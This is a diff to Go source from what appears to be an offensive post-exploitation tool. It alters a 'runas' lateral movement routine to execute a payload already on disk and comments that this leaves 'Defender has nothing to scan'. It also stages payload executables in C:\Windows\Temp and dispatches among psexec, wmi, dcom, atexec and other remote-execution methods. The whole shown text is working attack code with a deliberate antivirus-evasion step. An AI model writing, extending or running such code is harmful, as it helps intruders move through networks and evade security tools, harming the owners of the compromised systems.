@@ -551,21 +551,27 @@ func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, 
 // process as the target user.
 //
 // Only works for local targets; use dcom/psexec for remote hosts.
-func lateralRunAs(host string, data []byte, svcName, user, pass string) (string, error) {
+func lateralRunAs(host string, data []byte, existingPath, svcName, user, pass string) (string, error) {
 	if !isLocalHost(host) {
 		return "", fmt.Errorf("runas only supports local targets — use psexec/wmi/dcom for remote hosts")
 	}
 	if svcName == "" {
 		svcName = randSvcName()
 	}
-	exeName := svcName + ".exe"
 
-	// Stage payload directly (no SMB loopback issue)
-	localPath := `C:\Windows\Temp\` + exeName
-	if err := os.WriteFile(localPath, data, 0644); err != nil {
-		localPath = `C:\Windows\` + exeName
-		if err2 := os.WriteFile(localPath, data, 0644); err2 != nil {
-			return "", fmt.Errorf("runas: write payload: %w", err)
+	var localPath string
+	if existingPath != "" {
+		// Reuse a file already on disk — no new write, Defender has nothing to scan.
+		localPath = existingPath
+	} else {
+		// Stage payload directly (no SMB loopback issue)
+		exeName := svcName + ".exe"
+		localPath = `C:\Windows\Temp\` + exeName
+		if err := os.WriteFile(localPath, data, 0644); err != nil {
+			localPath = `C:\Windows\` + exeName
+			if err2 := os.WriteFile(localPath, data, 0644); err2 != nil {
+				return "", fmt.Errorf("runas: write payload: %w", err)
+			}
 		}
 	}
 
@@ -616,7 +622,7 @@ func lateralRunAs(host string, data []byte, svcName, user, pass string) (string,
 // ── dispatcher ────────────────────────────────────────────────────────────────
 
 // runLateral dispatches to the chosen lateral movement method.
-func runLateral(method, host string, data []byte, svcName, user, pass string) (string, error) {
+func runLateral(method, host string, data []byte, existingPath, svcName, user, pass string) (string, error) {
 	switch strings.ToLower(strings.TrimSpace(method)) {
 	case "psexec":
 		return lateralPSExec(host, data, svcName, user, pass)
@@ -633,7 +639,7 @@ func runLateral(method, host string, data []byte, svcName, user, pass string) (s
 	case "atexec", "at":
 		return lateralATExec(host, data, svcName, user, pass)
 	case "runas":
-		return lateralRunAs(host, data, svcName, user, pass)
+		return lateralRunAs(host, data, existingPath, svcName, user, pass)
 	default:
 		return "", fmt.Errorf("unknown method %q — use psexec|wmi|winrm|ssh|dcom|smbexec|atexec|runas", method)
 	}
